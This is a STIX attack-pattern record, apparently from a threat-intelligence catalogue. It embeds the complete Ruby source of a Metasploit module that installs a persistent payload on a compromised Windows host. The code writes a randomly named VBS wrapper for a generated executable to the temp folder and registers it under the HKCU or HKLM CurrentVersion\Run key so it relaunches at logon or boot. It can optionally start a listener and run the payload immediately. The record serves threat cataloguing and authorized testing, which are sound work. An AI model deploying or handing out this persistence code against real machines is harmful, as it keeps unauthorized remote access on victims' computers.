{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23b39e1e-3d79-4c77-9b69-266b89ffaead",
    "created": "2024-08-14T16:49:25.855554Z",
    "modified": "2024-08-14T16:49:25.855558Z",
    "name": "Windows Persistent Registry Startup Payload Installer",
    "description": " This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in \"CurrentVersion\\Run\" (depending on privilege and selected method).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/persistence.rb",
            "external_id": "persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Persistent Registry Startup Payload Installer',\n        'Description' => %q{\n          This module will install a payload that is executed during boot.\n          It will be executed either at user logon or system startup via the registry\n          value in \"CurrentVersion\\Run\" (depending on privilege and selected method).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'g0tmi1k' # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [ [ 'Windows', {} ] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2011-10-19',\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n              stdapi_sys_config_sysinfo\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptInt.new('DELAY',\n                 [true, 'Delay (in seconds) for persistent payload to keep reconnecting back.', 10]),\n      OptEnum.new('STARTUP',\n                  [true, 'Startup type for the persistent payload.', 'USER', ['USER', 'SYSTEM']]),\n      OptString.new('VBS_NAME',\n                    [false, 'The filename to use for the VBS persistent script on the target host (%RAND% by default).', nil]),\n      OptString.new('EXE_NAME',\n                    [false, 'The filename for the payload to be used on the target host (%RAND%.exe by default).', nil]),\n      OptString.new('REG_NAME',\n                    [false, 'The name to call registry value for persistence on target host (%RAND% by default).', nil]),\n      OptString.new('PATH',\n                    [false, 'Path to write payload (%TEMP% by default).', nil])\n    ])\n\n    register_advanced_options([\n      OptBool.new('HANDLER',\n                  [false, 'Start an exploit/multi/handler job to receive the connection', false]),\n      OptBool.new('EXEC_AFTER',\n                  [false, 'Execute persistent script after installing.', false])\n    ])\n  end\n\n  # Exploit method for when exploit command is issued\n  def exploit\n    # Define default values\n    rvbs_name = datastore['VBS_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))\n    rexe_name = datastore['EXE_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))\n    reg_val = datastore['REG_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))\n    startup = datastore['STARTUP'].downcase\n    delay = datastore['DELAY']\n    exec_after = datastore['EXEC_AFTER']\n    handler = datastore['HANDLER']\n    @clean_up_rc = \"\"\n\n    rvbs_name = rvbs_name + '.vbs' if rvbs_name[-4, 4] != '.vbs'\n    rexe_name = rexe_name + '.exe' if rexe_name[-4, 4] != '.exe'\n\n    # Connect to the session\n    begin\n      host = session.session_host\n      print_status(\"Running persistent module against #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n    rescue => e\n      print_error(\"Could not connect to session: #{e}\")\n      return nil\n    end\n\n    # Check values\n    if is_system? && startup == 'user'\n      print_warning('Note: Current user is SYSTEM & STARTUP == USER. This user may not login often!')\n    end\n\n    if handler && !datastore['DisablePayloadHandler']\n      # DisablePayloadHandler will stop listening after the script finishes - we want a job so it continues afterwards!\n      print_warning(\"Note: HANDLER == TRUE && DisablePayloadHandler == TRUE. This will create issues...\")\n      print_warning(\"Disabling HANDLER...\")\n      handler = false\n    end\n\n    # Generate the exe payload\n    vprint_status(\"Generating EXE payload (#{rexe_name})\")\n    exe = generate_payload_exe\n    # Generate the vbs payload\n    vprint_status(\"Generating VBS persistent script (#{rvbs_name})\")\n    vbsscript = ::Msf::Util::EXE.to_exe_vbs(exe, { :persist => true, :delay => delay, :exe_filename => rexe_name })\n    # Writing the payload to target\n    vprint_status(\"Writing payload inside the VBS script on the target\")\n    script_on_target = write_script_to_target(vbsscript, rvbs_name)\n    # Exit the module because we failed to write the file on the target host\n    # Feedback has already been given to the user, via the function.\n    return unless script_on_target\n\n    # Initial execution of persistent script\n    case startup\n    when 'user'\n      # If we could not write the entry in the registy we exit the module.\n      return unless write_to_reg(\"HKCU\", script_on_target, reg_val)\n\n      vprint_status(\"Payload will execute when USER (#{session.sys.config.getuid}) next logs on\")\n    when 'system'\n      # If we could not write the entry in the registy we exit the module.\n      return unless write_to_reg(\"HKLM\", script_on_target, reg_val)\n\n      vprint_status(\"Payload will execute at the next SYSTEM startup\")\n    else\n      print_error(\"Something went wrong. Invalid STARTUP method: #{startup}\")\n      return nil\n    end\n\n    # Do we setup a exploit/multi/handler job?\n    if handler\n      listener_job_id = create_multihandler(datastore['LHOST'], datastore['LPORT'], datastore['PAYLOAD'])\n      if listener_job_id.blank?\n        print_error(\"Failed to start exploit/multi/handler on #{datastore['LPORT']}, it may be in use by another process.\")\n      end\n    end\n\n    # Do we execute the VBS script afterwards?\n    target_exec(script_on_target) if exec_after\n\n    # Create 'clean up' resource file\n    clean_rc = log_file()\n    file_local_write(clean_rc, @clean_up_rc)\n    print_status(\"Clean up Meterpreter RC file: #{clean_rc}\")\n\n    report_note(:host => host,\n                :type => \"host.persistance.cleanup\",\n                :data => {\n                  :local_id => session.sid,\n                  :stype => session.type,\n                  :desc => session.info,\n                  :platform => session.platform,\n                  :via_payload => session.via_payload,\n                  :via_exploit => session.via_exploit,\n                  :created_at => Time.now.utc,\n                  :commands => @clean_up_rc\n                })\n  end\n\n  # Writes script to target host and returns the pathname of the target file or nil if the\n  # file could not be written.\n  def write_script_to_target(vbs, name)\n    filename = name || Rex::Text.rand_text_alpha((rand(8) + 6)) + \".vbs\"\n    temppath = datastore['PATH'] || session.sys.config.getenv('TEMP')\n    filepath = temppath + \"\\\\\" + filename\n\n    unless directory?(temppath)\n      print_error(\"#{temppath} does not exist on the target\")\n      return nil\n    end\n\n    if file?(filepath)\n      print_warning(\"#{filepath} already exists on the target. Deleting...\")\n      begin\n        file_rm(filepath)\n        print_good(\"Deleted #{filepath}\")\n      rescue\n        print_error(\"Unable to delete file!\")\n        return nil\n      end\n    end\n\n    begin\n      write_file(filepath, vbs)\n      print_good(\"Persistent VBS script written on #{sysinfo['Computer']} to #{filepath}\")\n\n      # Escape windows pathname separators.\n      @clean_up_rc << \"rm #{filepath.gsub(/\\\\/, '//')}\\n\"\n    rescue\n      print_error(\"Could not write the payload on the target\")\n      # Return nil since we could not write the file on the target\n      filepath = nil\n    end\n\n    filepath\n  end\n\n  # Installs payload in to the registry HKLM or HKCU\n  def write_to_reg(key, script_on_target, registry_value)\n    regsuccess = true\n    nam = registry_value || Rex::Text.rand_text_alpha(rand(8) + 8)\n    key_path = \"#{key.to_s}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n\n    print_status(\"Installing as #{key_path}\\\\#{nam}\")\n\n    if key && registry_setvaldata(key_path, nam, script_on_target, \"REG_SZ\")\n      print_good(\"Installed autorun on #{sysinfo['Computer']} as #{key_path}\\\\#{nam}\")\n    else\n      print_error(\"Failed to make entry in the registry for persistence\")\n      regsuccess = false\n    end\n\n    regsuccess\n  end\n\n  # Executes script on target and returns true if it was successfully started\n  def target_exec(script_on_target)\n    execsuccess = true\n    print_status(\"Executing script #{script_on_target}\")\n    # Lets give the target a few seconds to catch up...\n    Rex.sleep(3)\n\n    # Error handling for process.execute() can throw a RequestError in send_request.\n    begin\n      unless datastore['EXE::Custom']\n        cmd_exec(\"wscript \\\"#{script_on_target}\\\"\")\n      else\n        cmd_exec(\"cscript \\\"#{script_on_target}\\\"\")\n      end\n    rescue\n      print_error(\"Failed to execute payload on target\")\n      execsuccess = false\n    end\n\n    execsuccess\n  end\n\n  # Starts a exploit/multi/handler session\n  def create_multihandler(lhost, lport, payload_name)\n    pay = client.framework.payloads.create(payload_name)\n    pay.datastore['LHOST'] = lhost\n    pay.datastore['LPORT'] = lport\n    print_status('Starting exploit/multi/handler')\n\n    unless check_for_listener(lhost, lport)\n      # Set options for module\n      mh = client.framework.exploits.create('multi/handler')\n      mh.share_datastore(pay.datastore)\n      mh.datastore['WORKSPACE'] = client.workspace\n      mh.datastore['PAYLOAD'] = payload_name\n      mh.datastore['EXITFUNC'] = 'thread'\n      mh.datastore['ExitOnSession'] = true\n      # Validate module options\n      mh.options.validate(mh.datastore)\n      # Execute showing output\n      mh.exploit_simple(\n        'Payload' => mh.datastore['PAYLOAD'],\n        'LocalInput' => self.user_input,\n        'LocalOutput' => self.user_output,\n        'RunAsJob' => true\n      )\n\n      # Check to make sure that the handler is actually valid\n      # If another process has the port open, then the handler will fail\n      # but it takes a few seconds to do so.  The module needs to give\n      # the handler time to fail or the resulting connections from the\n      # target could end up on on a different handler with the wrong payload\n      # or dropped entirely.\n      Rex.sleep(5)\n      return nil if framework.jobs[mh.job_id.to_s].nil?\n\n      return mh.job_id.to_s\n    else\n      print_error('A job is listening on the same local port')\n      return nil\n    end\n  end\n\n  # Method for checking if a listener for a given IP and port is present\n  # will return true if a conflict exists and false if none is found\n  def check_for_listener(lhost, lport)\n    client.framework.jobs.each do |k, j|\n      if j.name =~ / multi\\/handler/\n        current_id = j.jid\n        current_lhost = j.ctx[0].datastore['LHOST']\n        current_lport = j.ctx[0].datastore['LPORT']\n        if lhost == current_lhost && lport == current_lport.to_i\n          print_error(\"Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}\")\n          return true\n        end\n      end\n    end\n    false\n  end\n\n  # Function for creating log folder and returning log path\n  def log_file(log_path = nil)\n    # Get hostname\n    host = session.sys.config.sysinfo[\"Computer\"]\n\n    # Create Filename info to be appended to downloaded files\n    filenameinfo = \"_\" + ::Time.now.strftime(\"%Y%m%d.%M%S\")\n\n    # Create a directory for the logs\n    if log_path\n      logs = ::File.join(log_path, 'logs', 'persistence',\n                         Rex::FileUtils.clean_path(host + filenameinfo))\n    else\n      logs = ::File.join(Msf::Config.log_directory, 'persistence',\n                         Rex::FileUtils.clean_path(host + filenameinfo))\n    end\n\n    # Create the log directory\n    ::FileUtils.mkdir_p(logs)\n\n    # logfile name\n    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + \".rc\"\n    logfile\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-19",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}